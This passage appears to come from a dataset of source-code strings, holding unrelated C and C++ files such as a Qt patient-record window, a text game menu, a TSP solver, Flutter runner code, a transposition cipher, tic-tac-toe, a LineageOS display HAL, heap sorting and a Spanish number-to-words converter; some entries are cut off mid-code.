QTextStream in(&file);\r\n            QString line;\r\n            bool found = false;\r\n            while (!in.atEnd()) {\r\n                line = in.readLine();\r\n                qDebug()<<username1;\r\n                if (line.startsWith(username1)) {\r\n                    found = true;\r\n                    break;\r\n                }\r\n            }\r\n            file.close();\r\n            if (found) {\r\n\r\n                QMessageBox::information(this, \"Medical Record\", line);\r\n            } else {\r\n\r\n                QMessageBox::information(this, \"Error\", \"Username not found in the file.\");\r\n            }\r\n        } else {\r\n\r\n            QMessageBox::critical(this, \"Error\", \"Failed to open the file.\");\r\n        }\r\n    }\r\n}\r\nvoid Patient::on_Appointment_clicked()\r\n{\r\n    RequestAppoint* request=new RequestAppoint;\r\n    request->show();\r\n}\r\n\r\n\r\nvoid Patient::on_chat_clicked()\r\n{\r\n\r\n    Chat* chat=new Chat;\r\n  chat->show();\r\n}\r\n\r\n\r\nvoid Patient::on_Back_clicked()\r\n{\r\n\r\n    MainWindow* mainwindow= new MainWindow;\r\n    mainwindow->show();\r\n    this->hide();\r\n}\r\n\r\n",
    "#include <iostream> \n#include <cstdlib> \n#include \"menu.h\"\n#include \"database.h\"\n#include \"Intro.h\"\n#include \"Tool.h\"\n\nauto spell = DB1.createSpells();\n\n\nvoid Menu::start(){\n    system(\"clear\");\n    \n    std::cout << std::endl << std::endl;\n    Too.slow_print(\"Welcome to Hobo Adventure \");\n    std::cout << std::endl << std::endl;\n    Too.slow_print(\"Press 1 to continue: \");\n   \n    int a = Too.getKeypress();\n\n    std::cout << std::endl<<std::endl;\n\n    if(a == '1'){\n        system(\"clear\");\n        T1.tutorial();\n    } else {\n        start();\n    }\n\n}   \n\n\n\n\nvoid Menu::selector() {\n    char a = 0;\n    do {\n        Too.slow_print(\"Select your action\");\n        std::cout << std::endl << std::endl;\n        std::cout << \"Type 1 to create a new hero\" << std::endl;\n        std::cout << \"Type 2 to see current heroes\" << std::endl;\n        std::cout << \"Type 3 to load a hero\" << std::endl;\n        std::cout << \"Type 4 to delete a hero\" << std::endl;\n        std::cout << \"Type 5 to exit game\" << std::endl << std::endl;\n        std::cout << \"Enter your choice: \";\n\n        a = Too.getKeypress();\n        std::cout << std::endl;\n\n        switch (a) {\n            case '1':\n                DB1.createHero();\n                break;\n            case '2':\n                DB1.ShowHeroes();\n                break;\n            case '3':\n                DB1.loadHero(spell);\n                break;\n            case '4':\n                DB1.deleteHero();\n                break;\n            case '5':\n                exit(0);\n                break;\n            default:\n                std::cout << \"Invalid input, press enter twice to try again\" << std::endl;\n                std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n');\n                std::cin.get();\n                system(\"clear\");\n                continue;\n        }\n    } while (a < '1' || a > '5');\n}\n\nMenu M1;",
    "// Nguoi du lich\r\n\r\n#include <iostream>\r\nusing namespace std;\r\n\r\nint n, a[105][105], X[105], d = 0, ans = INT_MAX, amin = INT_MAX;\r\nbool visited[105];\r\n\r\nvoid Try(int i) {\r\n\tfor(int j=1; j<=n; j++)\r\n\t\tif (visited[j] == 0) {\r\n\t\t\tvisited[j] = 1;\r\n\t\t\tX[i] = j;\r\n\t\t\td += a[X[i - 1]][X[i]];\r\n\t\t\tif (i == n) ans = min(ans, d + a[X[n]][1]);\r\n\t\t\telse if (d + (n - i + 1) * amin < ans) Try(i + 1);\r\n\t\t\tvisited[j] = 0;\r\n\t\t\td -= a[X[i - 1]][X[i]];\r\n\t\t}\r\n}\r\n\r\nint main() {\r\n\tcin >> n;\r\n\tfor (int i = 1; i <= n; i++)\r\n\t\tfor (int j = 1; j <= n; j++) {\r\n\t\t\tcin >> a[i][j];\r\n\t\t\tif (a[i][j] != 0) amin = min(amin, a[i][j]);\r\n\t\t}\r\n\tX[1] = 1;\r\n\tvisited[1] = 1;\r\n\tTry(2);\r\n\tcout << ans;\r\n\r\n}\r\n\r\n/**\r\n11\r\n0 7 83 7 98 95 96 43 19 5 77\r\n7 0 90 91 91 93 85 47 88 29 24\r\n83 90 0 95 44 12 58 32 78 20 51 \r\n7 91 95 0 9 51 45 52 47 49 12\r\n98 91 44 9 0 48 28 18 57 17 67\r\n95 93 12 51 48 0 54 82 40 33 78 \r\n96 85 58 45 28 54 0 55 31 22 100\r\n43 47 32 52 18 82 55 0 66 97 76\r\n19 88 78 47 57 40 31 66 0 58 68 \r\n5 29 20 49 17 33 22 97 58 0 23\r\n77 24 51 12 67 78 100 76 68 23 0\r\n*/",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"ecommerce_flutter\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\n#include <algorithm>\r\n#include <string>\r\n#include <vector>\r\n#include <cmath>\r\nusing namespace std;\r\nvoid Decrypt(string text, string key);\r\nbool visit(int n, vector <int> visited);\r\n\r\nvoid Encrypt(string text, string key)\r\n{\r\n    double row=ceil(static_cast<double>(text.size()) / key.size());\r\n    int row1 = row;\r\n    int array1[key.size()];\r\n    int array2[key.size()];\r\n    int final[key.size()];\r\n    vector <int> visited;\r\n    char matrix[row1][key.size()];\r\n    string key1,encrypt;\r\n    // Converting each char to uppercase\r\n    for(int i=0;i<key.size();i++)\r\n    {\r\n        int temp=key[i];\r\n        if(temp>=65 && temp<=90)\r\n        {\r\n            char temp=key[i];\r\n            key1+=temp;\r\n        }\r\n        else{\r\n            char t=key[i];\r\n            t=t-32;\r\n            key1+=t;\r\n        }\r\n    }\r\n    cout<<key1<<endl;\r\n    // Extracting each character of the string(key)\r\n    for(int i=0;i<key1.size();i++)\r\n    {\r\n        int temp;\r\n        temp=key1[i];\r\n        array1[i]=temp;\r\n        cout<<array1[i]<<\" \";\r\n    }\r\n    for(int i=0;i<key.size();i++)\r\n    {\r\n        array2[i]=array1[i];\r\n    }\r\n    cout<<endl;\r\n    // Sorting array\r\n    for(int i=0;i<key.size();i++)\r\n    {\r\n        int min=i;;\r\n        for(int j=i+1;j<key.size();j++)\r\n        {\r\n            if(array2[j]<array2[min])\r\n            {\r\n                min=j;\r\n            }\r\n        }\r\n        int temp=array2[i];\r\n        array2[i]=array2[min];\r\n        array2[min]=temp;\r\n        cout<<array2[i]<<\" \";\r\n    }\r\n    // Finding index for printing encrypted message\r\n    cout<<endl;\r\n    int k=0;\r\n    for(int i=0;i<key1.size();i++)\r\n    {\r\n        for(int j=0;j<key.size();j++)\r\n        {\r\n            if(array2[i]==array1[j])\r\n            {\r\n                if(visit(j,visited)==0)\r\n                {\r\n                    final[k]=j;\r\n                    visited.push_back(j);\r\n                    cout<<final[k]<<\" \";\r\n                    k++;\r\n                    break;\r\n                }\r\n                else{\r\n                    continue;\r\n                }\r\n            }\r\n        }\r\n    }\r\n    // Printing the text in matrix format\r\n    cout<<endl;\r\n    int m=0;\r\n    for(int i=0;i<row1;i++)\r\n    {\r\n        for(int j=0;j<key1.size();j++)\r\n        {\r\n            char at=text[m];\r\n            if(at!='\\0')\r\n            {\r\n            matrix[i][j]=text[m];\r\n            cout<<matrix[i][j]<<\" \";\r\n            m++;\r\n            }\r\n            else{\r\n                if((j+1)!=key1.size())\r\n                {\r\n                    while(j!=key1.size())\r\n                    {\r\n                        matrix[i][j]=' ';\r\n                        cout<<matrix[i][j]<<\" \";\r\n                        j++;\r\n                    }\r\n                }\r\n            }\r\n        }\r\n        cout<<endl;\r\n    }\r\n    cout<<endl;\r\n    //Printing and storing the encrypted text in a string\r\n    for(int i=0;i<key1.size();i++)\r\n    {\r\n        for(int j=0;j<row1;j++)\r\n        {\r\n            char temp=matrix[j][final[i]];\r\n            encrypt+=temp;\r\n        }\r\n    }\r\n    cout<<encrypt;\r\n    cout<<endl<<\"Would you like to decrypt the message?(1/0) \";\r\n    int choice;\r\n    cin>>choice;\r\n    if(choice==1)\r\n    {\r\n        Decrypt(encrypt,key1);\r\n    }\r\n    else\r\n    {\r\n        exit(0);\r\n    }\r\n}\r\n\r\nvoid Decrypt(string text, string key)\r\n{\r\n    double row=ceil(static_cast<double>(text.size()) / key.size());\r\n    int row1=int(row);\r\n    int array1[key.size()];\r\n    int array2[key.size()];\r\n    int final[key.size()];\r\n    vector <int> visited;\r\n    char matrix[row1][key.size()];\r\n    string decrypt;\r\n    cout<<key<<endl;\r\n    for(int i=0;i<key.size();i++)\r\n    {\r\n        int temp;\r\n        temp=key[i];\r\n        array1[i]=temp;\r\n        cout<<array1[i]<<\" \";\r\n    }\r\n    for(int i=0;i<key.size();i++)\r\n    {\r\n        array2[i]=array1[i];\r\n    }\r\n    cout<<endl;\r\n    // Sorting array\r\n    for(int i=0;i<key.size();i++)\r\n    {\r\n        int min=i;;\r\n        for(int j=i+1;j<key.size();j++)\r\n        {\r\n            if(array2[j]<array2[min])\r\n            {\r\n                min=j;\r\n            }\r\n        }\r\n        int temp=array2[i];\r\n        array2[i]=array2[min];\r\n        array2[min]=temp;\r\n        cout<<array2[i]<<\" \";\r\n    }\r\n    // Finding index for printing encrypted message\r\n    cout<<endl;\r\n    int k=0;\r\n    for(int i=0;i<key.size();i++)\r\n    {\r\n        for(int j=0;j<key.size();j++)\r\n        {\r\n            if(array2[i]==array1[j])\r\n            {\r\n                if(visit(j,visited)==0)\r\n                {\r\n                    final[k]=j;\r\n                    visited.push_back(j);\r\n                    cout<<final[k]<<\" \";\r\n                    k++;\r\n                    break;\r\n                }\r\n                else\r\n                {\r\n                    continue;\r\n                }\r\n            }\r\n        }\r\n    }\r\n    // Printing the text in matrix format\r\n    cout<<endl;\r\n    int m=0;\r\n    for(int i=0;i<key.size();i++)\r\n    {\r\n        for(int j=0;j<row1;j++)\r\n        {\r\n  ",
    "#include <stdio.h>\n#include <stdlib.h>\n\nchar converter(int numero) {\n    char letra;\n    switch(numero) {\n        case 1: letra = 'O'; break;\n        case 3: letra = 'X'; break;\n        default: letra = ' '; break;\n    }\n    return letra;\n}\n\nvoid mostrarTabuleiro(int matriz[3][3]) {\n    for (int i = 0; i < 3; i++) {\n        if (i > 0) printf(\"-----\\n\");\n        printf(\"%c|%c|%c\\n\", converter(matriz[i][0]), converter(matriz[i][1]), converter(matriz[i][2]));\n    }\n}\n\nvoid usuarioJoga(int matriz[3][3]) {\n    int linha, coluna;\n    do {\n        printf(\"Escolha linha e coluna (0-2): \");\n        scanf(\"%d %d\", &linha, &coluna);\n    } while (linha < 0 || linha > 2 || coluna < 0 || coluna > 2 || matriz[linha][coluna] != 2);\n    matriz[linha][coluna] = 1; // O jogador sempre joga com 'O'\n}\n\nint verificaSeXGanhou(int matriz[3][3]) {\n    int produtos[8] = {1, 1, 1, 1, 1, 1, 1, 1}; // 3 linhas, 3 colunas, 2 diagonais\n    for (int i = 0; i < 3; i++) {\n        for (int j = 0; j < 3; j++) {\n            produtos[i] *= matriz[i][j]; // Linhas\n            produtos[3 + j] *= matriz[i][j]; // Colunas\n            if (i == j) produtos[6] *= matriz[i][j]; // Diagonal principal\n            if (i + j == 2) produtos[7] *= matriz[i][j]; // Diagonal secund\u00e1ria\n        }\n    }\n    for (int i = 0; i < 8; i++) {\n        if (produtos[i] == 27) return 1; // 3 * 3 * 3 = 27, X ganhou\n    }\n    return 0;\n}\n\nint verificaSeOGanhou(int matriz[3][3]) {\n    int produtos[8] = {1, 1, 1, 1, 1, 1, 1, 1};\n    for (int i = 0; i < 3; i++) {\n        for (int j = 0; j < 3; j++) {\n            produtos[i] *= matriz[i][j];\n            produtos[3 + j] *= matriz[i][j];\n            if (i == j) produtos[6] *= matriz[i][j];\n            if (i + j == 2) produtos[7] *= matriz[i][j];\n        }\n    }\n    for (int i = 0; i < 8; i++) {\n        if (produtos[i] == 1) return 1; // 1 * 1 * 1 = 1, O ganhou\n    }\n    return 0;\n}\nvoid computadorJoga(int matriz[3][3]) {\n    int linha, coluna;\n    // Verifica se o computador pode ganhar em alguma linha\n    for (linha = 0; linha < 3; linha++) {\n        int soma = 1; // Come\u00e7a com 1 para multiplica\u00e7\u00e3o\n        for (coluna = 0; coluna < 3; coluna++) {\n            soma *= matriz[linha][coluna];\n        }\n        if (soma == 18) { // 2 * 3 * 3 = 18, a linha tem duas casas do computador e uma vazia\n            for (coluna = 0; coluna < 3; coluna++) {\n                if (matriz[linha][coluna] == 2) {\n                    matriz[linha][coluna] = 3; // Faz a jogada para ganhar\n                    return;\n                }\n            }\n        }\n    }\n    // Verifica se o computador pode ganhar em alguma coluna\n    for (coluna = 0; coluna < 3; coluna++) {\n        int soma = 1;\n        for (linha = 0; linha < 3; linha++) {\n            soma *= matriz[linha][coluna];\n        }\n        if (soma == 18) {\n            for (linha = 0; linha < 3; linha++) {\n                if (matriz[linha][coluna] == 2) {\n                    matriz[linha][coluna] = 3;\n                    return;\n                }\n            }\n        }\n    }\n    // Verifica se o computador pode ganhar na diagonal principal\n    int somaDiagonalPrincipal = 1;\n    for (linha = 0; linha < 3; linha++) {\n        somaDiagonalPrincipal *= matriz[linha][linha];\n    }\n    if (somaDiagonalPrincipal == 18) {\n        for (linha = 0; linha < 3; linha++) {\n            if (matriz[linha][linha] == 2) {\n                matriz[linha][linha] = 3;\n                return;\n            }\n        }\n    }\n    // Verifica se o computador pode ganhar na diagonal secund\u00e1ria\n    int somaDiagonalSecundaria = 1;\n    for (linha = 0; linha < 3; linha++) {\n        somaDiagonalSecundaria *= matriz[linha][2 - linha];\n    }\n    if (somaDiagonalSecundaria == 18) {\n        for (linha = 0; linha < 3; linha++) {\n            if (matriz[linha][2 - linha] == 2) {\n                matriz[linha][2 - linha] = 3;\n                return;\n            }\n        }\n    }\n    // Se n\u00e3o puder ganhar, verifica se pode bloquear o jogador 'O'\n    // Verifica se o jogador 'O' pode ganhar em alguma linha\n    for (linha = 0; linha < 3; linha++) {\n        int soma = 1;\n        for (coluna = 0; coluna < 3; coluna++) {\n            soma *= matriz[linha][coluna];\n        }\n        if (soma == 2) { // 1 * 2 * 1 = 2, a linha tem duas casas do jogador 'O' e uma vazia\n            for (coluna = 0; coluna < 3; coluna++) {\n                if (matriz[linha][coluna] == 2) {\n                    matriz[linha][coluna] = 3; // Bloqueia a jogada do jogador 'O'\n                    return;\n                }\n            }\n        }\n    }\n    // Verifica se o jogador 'O' pode ganhar em alguma coluna\n    for (coluna = 0; coluna < 3; coluna++) {\n        int soma = 1;\n        for (linha = 0; linha < 3; linha++) {\n            soma *= matriz[linha][coluna];\n        }\n        if (soma == 2) {\n            for (linha = 0; linha < 3; linha++) {\n                if (matriz[linha][coluna] == 2) {\n                    matriz[linha][coluna] = 3;\n                    return;\n      ",
    "/*\n * Copyright (C) 2022 The LineageOS Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#include \"SunlightEnhancement.h\"\n#include <android-base/file.h>\n#include <android-base/strings.h>\n\nusing ::android::base::ReadFileToString;\nusing ::android::base::Trim;\nusing ::android::base::WriteStringToFile;\n\nnamespace {\n\nconstexpr const char* kHbmPath = \"/sys/kernel/oplus_display/hbm\";\n\n}  // anonymous namespace\n\nnamespace vendor {\nnamespace lineage {\nnamespace livedisplay {\nnamespace V2_1 {\nnamespace implementation {\n\nReturn<bool> SunlightEnhancement::isEnabled() {\n    std::string tmp;\n    int32_t contents = 0;\n\n    if (ReadFileToString(kHbmPath, &tmp)) {\n        contents = std::stoi(Trim(tmp));\n    }\n\n    return contents > 0;\n}\n\nReturn<bool> SunlightEnhancement::setEnabled(bool enabled) {\n    return WriteStringToFile(std::to_string(enabled), kHbmPath, true);\n}\n\n}  // namespace implementation\n}  // namespace V2_1\n}  // namespace livedisplay\n}  // namespace lineage\n}  // namespace vendor\n",
    "/********************************************************************************************************************************\n**                      \t\tEast China Normal University\n**                               http://www.ecnu.edu.cn/\n**--------------File Info--------------------------------------------------------------------------------------------------------\n** File name:           tri_sort.cpp\n** Created by:          linzhaohua\n** Created date:        2019-11-26\n** Version:             V1.0\n** Descriptions:        \u5bf9\u4e8e\u5806\u6392\u5e8f\uff1aheapSize\u4e3a\u5806\u6392\u5e8f\u7684\u5927\u5c0f\uff0c\u6570\u7ec4\u4e2d\u8282\u70b9\u4e0b\u6807\u4e3a[0,heapSize-1],\u5176\u4e2d[0, (heapSize-1)/2]\u4e3a\u975e\u53f6\u5b50\u8282\u70b9\u3002\n\t\t\t\t\t\t\u5bf9\u4e8e\u4e0b\u6807\u4e3aindex\u7684\u8282\u70b9\uff0c\u5176left = 2*index + 1,right = left + 1,parent = (index - 1) / 2\n********************************************************************************************************************************/\n#include \"../headers/config.h\"\n/********************************************************************************************************************************\n** Function name:       Build_Min_Heap_TRI\n** Descriptions:        \u6784\u5efa\u6700\u5c0f\u5806\u6392\u5e8f\n** input parameters:    evtSort_2D,heapSize\n** output parameters:   None\n** Returned value:      None\n********************************************************************************************************************************/\nvoid Build_Min_Heap_TRI(vector<EVT2D>& evtSort_2D, int heapSize)\n{\n\tfor (int i = (heapSize - 1) / 2; i >= 0; i--)\n\t{\n\t\tMin_Heapify_TRI(evtSort_2D, i, heapSize);\n\t}\n}\n/********************************************************************************************************************************\n** Function name:       Min_Heapify_TRI\n** Descriptions:        \u5355\u72ec\u5bf9\u6392\u5e8f\u4e2dindex\u4f4d\u7f6e\u8fdb\u884c\u6700\u5c0f\u5806\u6392\u5e8f\n** input parameters:    evtSort_2D,index: [0,heapSize-1],heapSize\n** output parameters:   None\n** Returned value:      None\n********************************************************************************************************************************/\nvoid Min_Heapify_TRI(vector<EVT2D>& evtSort_2D, int index, int heapSize)\n{\n\tint left;\n\tint right;\n\tint min;\n\tEVT2D eventTemp;\n\n\tleft = 2 * index + 1;\n\tright = left + 1;\n\tif (left < heapSize && evtSort_2D[left].tau < evtSort_2D[index].tau)\n\t{\n\t\tmin = left;\n\t}\n\telse\n\t{\n\t\tmin = index;\n\t}\n\tif (right < heapSize && evtSort_2D[right].tau < evtSort_2D[min].tau)\n\t{\n\t\tmin = right;\n\t}\n\tif (min != index)\n\t{\n\t\teventTemp = evtSort_2D[index];\n\t\tevtSort_2D[index] = evtSort_2D[min];\n\t\tevtSort_2D[min] = eventTemp;\n\n\t\tChange_PosIn_EvtSort_Of_Net_TRI(evtSort_2D[index].posIn_Tri, index);\n\t\tChange_PosIn_EvtSort_Of_Net_TRI(evtSort_2D[min].posIn_Tri, min);\n\n\t\tMin_Heapify_TRI(evtSort_2D, min, heapSize);\n\t}\n}\n/********************************************************************************************************************************\n** Function name:       Change_PosIn_EvtSort_Of_Net_TRI\n** Descriptions:        \u66f4\u65b0\u7f51\u7edc\u4e2dposIn_EvtSort_2D\u7684\u503c\n** input parameters:    p_node,newPos\n** output parameters:   None\n** Returned value:      None\n********************************************************************************************************************************/\nvoid Change_PosIn_EvtSort_Of_Net_TRI(TRINODE *p_node, int newPos)\n{\n\tp_node->posIn_EvtSort_2D = newPos;\n}\n/********************************************************************************************************************************\n** Function name:       Min_Heap_Change_Key_TRI\n** Descriptions:        \u5c06\u6700\u5c0f\u5806\u4e2dindex\u4f4d\u7f6e\u7684\u503c\u6539\u4e3adata\uff0c\u5e76\u4e14\u8fdb\u884c\u6700\u5c0f\u5806\u6392\u5e8f\uff0c\u5f97\u5230\u66f4\u65b0\u540e\u7684\u6700\u5c0f\u5806\n** input parameters:    evtSort_2D,index: [0,heapSize-1],data,heapSize\n** output parameters:   None\n** Returned value:      None\n********************************************************************************************************************************/\nvoid Min_Heap_Change_Key_TRI(vector<EVT2D>& evtSort_2D, int index, double data, int heapSize)\n{\n\tint parent = (index - 1) / 2;\n\tEVT2D eventTemp;\n\n\tif (data > evtSort_2D[index].tau)\t\t\t\t\t\t\t\t\t//\u5728\u6700\u5c0f\u5806\u4e2d\uff0c\u82e5data\u503c\u6bd4old\u503c\u5927\uff0c\u5219\u4e0b\u79fb\uff0c\u8c03\u7528Min_Heapify\u51fd\u6570\uff08\u53d8\u5927\uff0c\u5219\u4e0b\u79fb\uff09\n\t{\n\t\tevtSort_2D[index].tau = data;\n\t\tMin_Heapify_TRI(evtSort_2D, index, heapSize);\n\t}\n\telse if (data < evtSort_2D[index].tau)\t\t\t\t\t\t\t\t//\u53d8\u5c0f\uff0c\u5219\u4e0a\u6d6e\n\t{\n\t\tevtSort_2D[index].tau = data;\n\t\twhile (index > 0 && evtSort_2D[parent].tau > evtSort_2D[index].tau)\n\t\t{\n\t\t\teventTemp = evtSort_2D[index];\n\t\t\tevtSort_2D[index] = evtSort_2D[parent];\n\t\t\tevtSort_2D[parent] = eventTemp;\n\n\t\t\tChange_PosIn_EvtSort_Of_Net_TRI(evtSort_2D[index].posIn_Tri, index);\n\t\t\tChange_PosIn_EvtSort_Of_Net_TRI(evtSort_2D[parent].posIn_Tri, parent);\n\n\t\t\tindex = parent;\n\t\t\tparent = (index - 1) / 2;\n\t\t}\n\t}\n}\n/********************************************************************************************************************************\n** Function name:       Min_Heap_Insert_TRI\n** Descriptions:        \u5728\u6700\u5c0f\u5806\u4e2d\u63d2\u5165evt\u8fd9\u4e2a\u5143\u7d20(\u7ed3\u675f\u540e\uff0c\u5806\u5927\u5c0f\u7531heapSize\u53d8\u4e3aheapSize+1)\n** input parameters:    evtSort_2D,evt,heapSize\n** output parameters:   None\n** Returned value:      None\n********************************************************************************************************************************/\nvoid Min_Heap_Insert_TRI(vector<E",
    "#include <iostream>\n#include <cmath>\nusing namespace std;\n\n/*\nEnunciado: Realizar un programa C++ que lea un n\u00famero real (correspondiente a un monto) y convertir\neste monto a palabra.\n\nRestricciones:\n\u2022 El # tiene mascara 999,999,999.99\n\u2022 Si el grupo determina puede variar el alcance del algoritmo.\n\u2022 Solo llevar a palabras la parte entera del n\u00famero.\n\u2022 Utilizar el enfoque de divide y venceras\n\nAutores: Darian Anderson King Arias\n\nFecha: 3/5/2024\n*/\n\nstring ConvertirAPalabras(int numero, bool unEnLugarDeUno=false);\nvoid ConvertirAPalabras(double num);\nvoid limpiarBuffer();\n\n\nstring cero_a_29[] = {\"uno\", \"dos\", \"tres\", \"cuatro\", \"cinco\", \"seis\", \"siete\", \"ocho\", \"nueve\", \"diez\",\n                  \"once\", \"doce\", \"trece\", \"catorce\", \"quince\", \"diecis\u00e9is\", \"diecisiete\", \"dieciocho\", \"diecinueve\", \"veinte\",\n                  \"veintiuno\", \"veintid\u00f3s\", \"veintitr\u00e9s\", \"veinticuatro\", \"veinticinco\", \"veintis\u00e9is\", \"veintisiete\", \"veintiocho\", \"veintinueve\"};\nstring decenas[] = { \"treinta\", \"cuarenta\", \"cincuenta\", \"sesenta\", \"setenta\", \"ochenta\", \"noventa\" };\nstring centenas[] = {\"ciento\", \"doscientos\", \"trescientos\", \"cuatrocientos\", \"quinientos\", \"seiscientos\", \"setecientos\", \"ochocientos\", \"novecientos\" };\n\nstring ConvertirAPalabras(int numero, bool unEnLugarDeUno) {\n    int unidad;\n    int decena;\n    int centena;\n    //0\n    if (numero == 0)\n        return \"cero\";\n    \n    //1-29\n    if (numero <= 29)\n    {\n        if (unEnLugarDeUno && numero == 21)\n            return \"veinti\u00fan \";\n        if (unEnLugarDeUno && numero == 1)\n            return \"un \";\n        return  cero_a_29[numero-1]+\"\" ;\n    }\n    //99\n    if (numero <=100) \n    {\n\n        unidad = numero % 10;\n        decena = numero / 10;\n        return numero == 100 ? \"cien \" : decenas[decena - 3] + (unidad != 0 ? \" y \" + ConvertirAPalabras(unidad, unEnLugarDeUno)+\" \" :\"\");\n    }\n    //999\n    if (numero <= 1000)\n    {\n        //centena\n        decena = numero % 100;\n        centena = numero / 100;\n        return numero == 1000? \"mil \" : centenas[centena - 1]+\" \"+ (decena != 0 ? \" \" + ConvertirAPalabras(decena, unEnLugarDeUno) : \"\");\n\n    }\n    // 999,999\n    if (numero / 1000<1000)\n    {\n        int Miles= numero/1000;\n        int restante = numero%1000;\n        return Miles == 1 ? \"mil \" + (restante != 0 ? \"\" + ConvertirAPalabras(restante) : \"\") : ConvertirAPalabras(Miles,true) + \"mil \" + (restante != 0 ? \"\" + ConvertirAPalabras(restante) : \"\");\n    }\n    if (numero/1000 < 1000000)\n    {\n        int x = numero/1000000;\n        int Millones = numero / 1000000;\n        int restante = numero % 1000000;\n        return Millones == 1 ? \"Un millon \" + (restante != 0 ? \"\" + ConvertirAPalabras(restante) : \"\") : ConvertirAPalabras(Millones, true) + \"millones \" + (restante != 0 ? \"\" + ConvertirAPalabras(restante) : \"\");\n    }\n\n    //corregin para un\n    return \"\";\n}\nvoid limpiarBuffer() {\n    cin.clear(); // Borrar el estado de error\n    cin.ignore(numeric_limits<streamsize>::max(), '\\n'); // Descartar cualquier car\u00e1cter en el b\u00fafer de entrada\n}\nvoid ConvertirAPalabras() {\n\n    double numero;\n    bool repeat =true;\n    while (repeat)\n    {\n        string menos=\"\";\n        cout << \"Por favor, introduce el monto: \";\n        cin >> numero;\n        if (cin.fail()) {\n            cout << \"Entrada no v\u00e1lida. Presione cualquier tecla para volver a intentarlo...\";\n            limpiarBuffer(); // Limpiar el b\u00fafer de entrada antes de esperar a que el usuario presione una tecla\n            cin.get();\n        }\n        if(numero < 0)\n        {\n                menos =\"Menos \";\n                numero *= -1.00;\n        }\n        if(numero>= 1000000000)\n        {\n            cout << \"Numero fuera de los limites -999,999,999.99-999,999,999.99. Presione cualquier tecla para volver a intentarlo...\";\n            limpiarBuffer(); // Limpiar el b\u00fafer de entrada antes de esperar a que el usuario presione una tecla\n            cin.get();\n        }\n        else\n        {\n            \n\n            if(numero < 0)\n            {\n                menos =\"Menos \";\n                numero *= -1.00;\n            }\n            int parteEntera = static_cast<int>(std::floor(numero));\n            \n            int centavos = static_cast<int>((numero - parteEntera) * 100);\n            string parteEnteraEnPalabras = ConvertirAPalabras(parteEntera);\n            std::cout << \"El monto en palabras es: \"<< menos << parteEnteraEnPalabras << \"con \" << centavos << \" centavos.\" << std::endl;\n            repeat =false;\n        }\n    }\n\n}\n\nint main() {\n    ConvertirAPalabras();\n   //999999999.12\n    return 0;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
